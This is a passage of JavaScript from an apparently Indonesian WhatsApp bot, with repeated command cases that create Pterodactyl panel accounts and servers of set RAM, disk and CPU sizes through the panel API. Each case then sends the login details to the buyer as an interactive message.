let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "21gb": case 'panel21gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "21350"
let cpu = "1050"
let disk = "21350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "22gb": case 'panel22gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "22350"
let cpu = "1100"
let disk = "22350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "23gb": case 'panel23gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "23350"
let cpu = "1150"
let disk = "23350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "24gb": case 'panel24gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "24350"
let cpu = "2200"
let disk = "24350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "25gb": case 'panel25gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "25350"
let cpu = "2250"
let disk = "25350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "26gb": case 'panel26gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "26350"
let cpu = "2300"
let disk = "26350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
